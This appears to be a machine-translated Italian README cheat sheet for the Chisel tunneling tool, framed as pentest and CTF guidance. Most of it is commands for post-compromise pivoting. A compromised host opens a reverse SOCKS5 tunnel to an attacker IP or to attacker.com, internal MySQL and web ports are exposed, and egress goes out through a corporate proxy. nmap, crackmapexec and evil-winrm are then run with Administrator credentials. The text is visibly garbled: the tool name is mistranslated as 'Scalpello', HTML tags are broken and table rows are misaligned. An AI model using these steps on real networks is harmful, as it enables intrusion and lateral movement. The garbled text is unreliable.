<!-- language-home-navigation -->
[🏠 Home Page Italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🚇 Scalpello - Foglio informativo completo

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
   ██████╗██╗  ██╗██╗███████╗███████╗██╗     
  ██╔════╝██║  ██║██║██╔════╝██╔════╝██║     
  ██║     ███████║██║███████╗█████╗  ██║     
  ██║     ██╔══██║██║╚════██║██╔══╝  ██║     
  ╚██████╗██║  ██║██║███████║███████╗███████╗
   ╚═════╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝
      Fast TCP/UDP Tunnel over HTTP via SSH
```
<palign="centro">
  <img src="https://img.shields.io/badge/Chisel-Tunneling-orange?style=for-the-badge" alt="Chisel">
  <img src="https://img.shields.io/badge/HTTP_WebSocket-Evasion-blue?style=for-the-badge" alt="WebSocket">
  <img src="https://img.shields.io/badge/SOCKS5-Proxy-green?style=for-the-badge" alt="SOCKS5">
  <img src="https://img.shields.io/badge/Go-Portable-red?style=for-the-badge" alt="Go">
</p>

<palign="centro">
  <b>⚡ Tunnel TCP/UDP veloce trasportato su HTTP, protetto tramite SSH, confezionato come un unico binario portatile</b>
</p>

---

## 📋 Sommario

- [Introduzione](#-introduzione)
- [Come funziona](#-come-funziona)
- [Installazione](#-installazione)
- [Modalità architettura e tunnel](#-architettura--modalità-tunnel)
- [Configurazione Pentest standard: proxy SOCKS5 inverso](#-standard-pentest-setup-reverse-socks5-proxy)
  - [Passaggio 1: avvia il server sull'attaccante](#step-1-avvia-server-on-attaccante)
  - [Passaggio 2: Connetti il client dalla destinazione](#step-2-connect-client-from-target)
  - [Passaggio 3: Configura Proxychains](#step-3-configure-proxychains)
  - [Passaggio 4: esecuzione degli strumenti sul tunnel](#passaggio-4-esecuzione-degli-strumenti-sul-tunnel)
- [Inoltro porta locale](#-local-port-forwarding)
- [Inoltro porta remoto (acquisizione del traffico in entrata)](#-inoltro-porta-remoto-cattura-traffico-in-entrata)
- [Autenticazione e blocco dell'impronta digitale](#-autenticazione--blocco dell'impronta digitale)
- [Evasione in uscita e concatenamento proxy HTTP](#-egress-evasion--http-proxy-chaining)
- [Chisel contro Ligolo-ng contro SSH](#-chisel-vs-ligolo-ng-vs-ssh)
- [Tabella di riferimento rapido](#-tabella-di-riferimento-rapido)
- [Suggerimenti e best practice](#-tips--best-practice)
- [Disclaimer legale](#-legal-disclaimer)
- [Risorse](#-risorse)

---

## 🎯 Introduzione

**Chisel** è uno strumento di tunneling multipiattaforma open source scritto in Go che incapsula sessioni SSH sicure all'interno di connessioni HTTP/WebSocket standard.

Poiché il traffico assomiglia a una comunicazione HTTP/HTTPS o WebSocket standard in rete, Chisel naviga facilmente attraverso firewall restrittivi, sistemi DPI (Deep Packet Inspection) e proxy Web aziendali che normalmente bloccherebbero il traffico SSH o VPN non elaborato.

### Punti di forza principali

- 🚀 **Binario singolo:** contiene sia il server che il client in un binario autonomo compilato staticamente.
- 🛡️ **Evasione del firewall:** Tunnel su porta standard 80/443 o WebSocket per integrarsi nel normale traffico web.
- 🔒 **Crittografato per impostazione predefinita:** utilizza la crittografia SSH dietro le quinte (chiavi ECDSA e AES-GCM).
- 🔄 **SOCKS5 e port forwarding:** crea proxy SOCKS5 inversi o porte inoltrate locali/remote specifiche senza sforzo.

---

## 🏗️Come funziona
```
+------------------------------------+                         +-----------------------------------+
|          Attacker Machine          |                         |       Compromised Target Host     |
|          (192.168.1.100)           |                         |            (Dual-homed)           |
|                                    |                         |                                   |
| [chisel server --reverse -p 8080]  | <==== HTTP/WebSocket == | [chisel client 192.168.1.100:8080 |
|               |                    |       (TCP Port 8080)   |                 R:1080:socks]     |
|               v                    |                         |                  |                |
|  Local Port 1080 (SOCKS5 Proxy)    |                         |                  v                |
|               |                    |                         |        Internal Network Interface |
|      [proxychains nmap]            |                         |            (172.16.1.0/24)        |
+------------------------------------+                         +-----------------------------------+
```
---

## 📥Installazione

### Kali Linux
```bash
sudo apt update && sudo apt install -y chisel
```
### Dalla fonte (Vai)
```bash
go install github.com/jpillora/chisel@latest
```
### Scarica i binari precompilati

Scarica i file binari autonomi per Linux, Windows e macOS dalle versioni ufficiali:
```bash
# Attacker Linux 64-bit
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
gzip -d chisel_1.9.1_linux_amd64.gz && mv chisel_1.9.1_linux_amd64 chisel && chmod +x chisel

# Windows Target 64-bit
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz
gzip -d chisel_1.9.1_windows_amd64.gz && mv chisel_1.9.1_windows_amd64 chisel.exe
```
---

## 🔄 Configurazione Pentest standard: proxy SOCKS5 inverso

Nei test di penetrazione standard e nei CTF, la macchina di destinazione è protetta da NAT/firewall e non può accettare connessioni dirette in entrata da parte tua. È necessario creare un **proxy SOCKS5 inverso**.

### Passaggio 1: avviare il server sull'attaccante

Avvia il server Chisel in ascolto sulla porta `8000` (o `443` per evasione) con il port forwarding inverso consentito:
```bash
chisel server --reverse -p 8000 -v
```
### Passaggio 2: connettere il client dalla destinazione

Esegui il client sulla macchina compromessa, riconnettendoti all'IP dell'aggressore e aprendo un proxy SOCKS5 inverso:

#### Destinazione Linux:
```bash
./chisel client 192.168.1.100:8000 R:1080:socks
```
#### Destinazione Windows:
```powershell
.\chisel.exe client 192.168.1.100:8000 R:1080:socks
```
> **Risultato:** Il server Chisel sul computer dell'aggressore apre la porta `1080` localmente come proxy SOCKS5 instradato attraverso il bersaglio!

### Passaggio 3: configurare le proxychain

Modifica `/etc/proxychains4.conf` (o `/etc/proxychains.conf`) sul computer dell'attaccante:
```ini
[ProxyList]
# protocol  host        port
socks5      127.0.0.1   1080
```
### Passaggio 4: eseguire gli strumenti sul tunnel

Prefissa qualsiasi strumento con `proxychains` per instradarlo attraverso l'host interno compromesso:
```bash
# Nmap TCP Connect scan
proxychains nmap -sT -Pn -p 80,445,3389 172.16.1.50

# SMB authentication
proxychains crackmapexec smb 172.16.1.0/24 -u Administrator -p 'Password123'

# Evil-WinRM shell to an internal domain controller
proxychains evil-winrm -i 172.16.1.5 -u Administrator -p 'Password123'
```
---

## 🔀 Port forwarding locale

Inoltra una porta interna specifica da dietro l'obiettivo direttamente al computer locale dell'aggressore senza bisogno di un proxy SOCKS completo.

### Esempio: accesso al servizio Web interno (porta 80)

Server dell'attaccante (`192.168.1.100:8000`):
```bash
chisel server --reverse -p 8000
```
Cliente in target:
```bash
# Forward target's internal localhost:80 to attacker's localhost:8080
./chisel client 192.168.1.100:8000 R:8080:127.0.0.1:80
```
Ora vai a `http://127.0.0.1:8080` sul tuo computer dell'aggressore per visualizzare il server web interno!

### Esempio: esposizione del database interno (MySQL 3306)

Cliente in target:
```bash
./chisel client 192.168.1.100:8000 R:3306:172.16.1.200:3306
```
Connettiti direttamente dal terminale dell'aggressore:
```bash
mysql -h 127.0.0.1 -P 3306 -u root -p
```
---

## 🌐 Inoltro porta remoto (cattura del traffico in entrata)

Esponi una porta sulla macchina bersaglio che rimanda a un servizio sulla tua macchina dell'aggressore (utile per servire carichi utili o intercettare callback).
```bash
# Target opens port 9000, sending incoming connections to attacker's 9000
./chisel client 192.168.1.100:8000 9000:127.0.0.1:9000
```
---

## 🔐 Autenticazione e blocco dell'impronta digitale

Negli ambienti live, le porte Chisel aperte possono essere violate da soggetti non autorizzati. Proteggi il tuo tunnel con l'autenticazione:

### Autenticazione (`--auth`)
```bash
# Attacker server enforces credentials
chisel server --reverse -p 8443 --auth "pentestuser:ComplexPassw0rd!"

# Target client authenticates
./chisel client --auth "pentestuser:ComplexPassw0rd!" 192.168.1.100:8443 R:1080:socks
```
### Blocco dell'impronta digitale (`--fingerprint`)

All'avvio, il server stampa la sua impronta digitale della chiave pubblica SSH:
```
2026/10/29 20:00:00 server: Fingerprint 8a:1f:9c:...
```
Verificalo sul client per impedire l'intercettazione del MITM:
```bash
./chisel client --fingerprint "8a:1f:9c:..." 192.168.1.100:8443 R:1080:socks
```
---

## 🛡️ Evasione in uscita e concatenamento proxy HTTP

Se la destinazione interna può accedere a Internet solo tramite un proxy aziendale di autenticazione:
```bash
# Route Chisel traffic through an upstream corporate proxy
./chisel client --proxy http://proxy.corp.local:8080 \
  --header "Proxy-Authorization: Basic dXNlcjpwYXNz" \
  https://attacker.com:443 R:1080:socks
```
---

## ⚖️ Scalpello vs Ligolo-ng vs SSH

| Caratteristica | Scalpello | Ligolo-ng | Tunneling SSH |
|---------|--------|-----------|---------------|
| **Metodo primario** | SOCKS5 e inoltro porta | Interfaccia TUN (VPN) | SOCKS5 e inoltro porta |
| **Protocollo Trasporti** | HTTP/WebSocket | TLS grezzo | SSH (porta 22) |
| **Elusione del firewall** | ⭐⭐⭐⭐⭐ Eccezionale | ⭐⭐⭐⭐ Molto buono | ⭐⭐ Scarso (Porta 22 solitamente bloccata) |
| **Richiede root/amministratore**| ❌ No (solo Userland) | ✅ Sì (per creare il dispositivo TUN) | ❌No |
| **Nmap SYN Scan (`-sS`)**| ❌No | ✅ Sì | ❌No |
| **Supporto UDP** | Parziale (tramite SOCKS5) | ✅ UDP nativo completo | ❌ Molto limitato |

---

## 📊 Tabella di consultazione rapida

| Modalità | Comando | Scopo |
|------|---------|---------|
| **Server (inverso)** | `chisel server --reverse -p 8000` | Avvia l'ascolto del server inverso su 8000 |
| **Cliente (SOCKS5 inverso)** | `chisel client <IP>:8000 R:1080:socks` | Crea SOCKS5 inversi sulla porta 1080 | dell'attaccante
| **Client (porta di inoltro)** | `chisel client <IP>:8000 R:8080:127.0.0.1:80` | Mappa la porta 80 del bersaglio sulla 8080 | dell'attaccante
| **Client (Esponi porta utente malintenzionato)** | `chisel client <IP>:8000 4444:127.0.0.1:4444` | Aprire la porta 4444 sull'instradamento target verso l'attaccante |
| **Server di autenticazione** | `chisel server --reverse --auth "u:p" -p 8000` | Richiedi credenziali dalla connessione dei client |
| **Cliente di autenticazione** | `chisel client --auth "u:p" <IP>:8000 R:socks` | Connettiti con credenziali |
| **Sintonizzazione Keep-Alive** | `chisel client --keepalive 10s <IP>:8000 R:socks`| Prevenire l'interruzione delle sessioni inattive del firewall |

---

## 💡 Suggerimenti e migliori pratiche

1. **Utilizza la porta 443 per la massima evasione:**
   I firewall spesso ispezionano il traffico su porte arbitrarie come 8000 o 8080. L'esecuzione del server Chisel sulla porta `443` garantisce che il traffico sia identico ai WebSocket HTTPS.
2. **Ottimizza il timeout delle catene proxy:**
   Se le connessioni proxychains sembrano lente, modifica `/etc/proxychains4.conf` e imposta:
   ```ini
   tcp_read_time_out 15000
   tcp_connect_time_out 8000
   ```
3. **Nessun privilegio di root richiesto sulla destinazione:**
   A differenza delle soluzioni VPN o TUN, Chisel funziona esclusivamente nello spazio utente. È possibile eseguire `chisel.exe` o `chisel` come account di servizio con privilegi limitati (`www-data`, `nobody`, utente Windows standard).

---

## ⚠️ Disclaimer legale

> **IMPORTANTE:** Chisel è destinato ai test di rete autorizzati, alla simulazione della squadra rossa e all'amministrazione dei sistemi. L'implementazione di strumenti di tunneling su reti non autorizzate viola le leggi sulla sicurezza informatica.

---

## 📚 Risorse

- [Repository GitHub di Chisel](https://github.com/jpillora/chisel)
- [Progetto Proxychains-NG](https://github.com/rofl0r/proxychains-ng)